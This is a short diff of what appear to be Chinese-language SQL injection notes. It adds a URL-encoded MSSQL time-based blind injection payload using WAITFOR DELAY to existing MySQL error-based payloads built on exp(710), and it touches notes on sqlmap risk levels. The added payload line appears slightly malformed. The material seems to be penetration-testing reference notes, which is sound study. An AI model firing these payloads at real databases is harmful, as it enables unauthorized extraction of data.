@@ -46,6 +46,8 @@ mysql:
 	'||if(substr(database(),1,1)='x',1,exp(710))||'
 	"||if(substr(database(),1,1)='x',1,exp(710))||"
 	也就是user()的第1位如果是x那么正常，反之报错
+	
+1'if(ascii(substring(db_name(),1,1)))>50%20WAITFOR%20DELAY%20'0:0:5'--%20
 ~~~
 
 
@@ -482,8 +484,6 @@ Oracle报错注入
 risk
 共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。
 ~~~
-
-
 
 
 
